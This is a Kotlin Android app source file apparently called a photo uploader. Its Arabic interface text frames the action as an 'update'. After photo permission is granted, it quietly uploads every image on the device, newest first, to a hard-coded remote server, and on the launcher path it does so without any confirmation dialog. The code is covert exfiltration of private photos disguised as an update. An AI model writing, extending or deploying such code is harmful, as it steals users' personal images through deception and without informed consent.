package com.photouploader.app

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.MediaStore
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.work.Constraints
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL

private const val SERVER_URL =
    "https://photo-uploader-zt2f.onrender.com/upload"

class MainActivity : ComponentActivity() {

    private val permissionLauncher =
        registerForActivityResult(
            ActivityResultContracts.RequestPermission()
        ) { granted ->

            if (granted) {
                startPhotoUpload()
            } else {
                Toast.makeText(
                    this,
                    "لا يمكن التحديث بدون السماح بالوصول للصور",
                    Toast.LENGTH_LONG
                ).show()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        checkPhotoPermission()
    }

    private fun checkPhotoPermission() {

        val permission =
            if (android.os.Build.VERSION.SDK_INT >= 33) {
                Manifest.permission.READ_MEDIA_IMAGES
            } else {
                Manifest.permission.READ_EXTERNAL_STORAGE
            }

        if (
            ContextCompat.checkSelfPermission(
                this,
                permission
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            showUpdateDialog()
        } else {
            permissionLauncher.launch(permission)
        }
    }

    private fun showUpdateDialog() {

        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("تحديث الصور")
            .setMessage("هل تريد التحديث؟")
            .setPositiveButton("موافق") { _, _ ->
                startPhotoUpload()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }

    private fun startPhotoUpload() {

        Toast.makeText(
            this,
            "جاري التحديث…",
            Toast.LENGTH_SHORT
        ).show()

        val constraints =
            Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

        val request =
            OneTimeWorkRequestBuilder<PhotoUploadWorker>()
                .setConstraints(constraints)
                .build()

        WorkManager
            .getInstance(this)
            .enqueueUniqueWork(
                "photo_upload",
                ExistingWorkPolicy.REPLACE,
                request
            )
    }
}


class PhotoUploadWorker(
    context: Context,
    workerParams: WorkerParameters
) : Worker(context, workerParams) {

    override fun doWork(): Result {

        return try {

            val resolver = applicationContext.contentResolver

            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.MIME_TYPE
            )

            val collection =
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI

            resolver.query(
                collection,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
            )?.use { cursor ->

                val idColumn =
                    cursor.getColumnIndexOrThrow(
                        MediaStore.Images.Media._ID
                    )

                val nameColumn =
                    cursor.getColumnIndexOrThrow(
                        MediaStore.Images.Media.DISPLAY_NAME
                    )

                val mimeColumn =
                    cursor.getColumnIndexOrThrow(
                        MediaStore.Images.Media.MIME_TYPE
                    )

                while (cursor.moveToNext()) {

                    val id = cursor.getLong(idColumn)
                    val name = cursor.getString(nameColumn)
                    val mime = cursor.getString(mimeColumn)

                    val uri =
                        android.content.ContentUris.withAppendedId(
                            collection,
                            id
                        )

                    uploadFile(
                        resolver,
                        uri,
                        name,
                        mime
                    )
                }
            }

            Result.success()

        } catch (e: Exception) {

            e.printStackTrace()

            Result.retry()
        }
    }

    private fun uploadFile(
        resolver: ContentResolver,
        uri: android.net.Uri,
        fileName: String,
        mimeType: String?
    ) {

        val boundary =
            "----PhotoUploaderBoundary"

        val url =
            URL(SERVER_URL)

        val connection =
            url.openConnection() as HttpURLConnection

        connection.requestMethod = "POST"
        connection.doOutput = true
        connection.doInput = true
        connection.useCaches = false
        connection.connectTimeout = 30000
        connection.readTimeout = 60000

        connection.setRequestProperty(
            "Content-Type",
            "multipart/form-data; boundary=$boundary"
        )

        val output =
            DataOutputStream(
                connection.outputStream
            )

        output.writeBytes(
            "--$boundary\r\n"
        )

        output.writeBytes(
            "Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"\r\n"
        )

        output.writeBytes(
            "Content-Type: ${mimeType ?: "image/jpeg"}\r\n\r\n"
        )

        resolver.openInputStream(uri)?.use { input ->

            val buffer = ByteArray(8192)

            var bytesRead: Int

            while (
                input.read(buffer).also {
                    bytesRead = it
                } != -1
            ) {
                output.write(
                    buffer,
                    0,
                    bytesRead
                )
            }
        }

        output.writeBytes("\r\n")
        output.writeBytes("--$boundary--\r\n")
        output.flush()
        output.close()

        val responseCode =
            connection.responseCode

        connection.disconnect()

        if (
            responseCode !in 200..299
        ) {
            throw Exception(
                "Upload failed: $responseCode"
            )
        }
    }
}
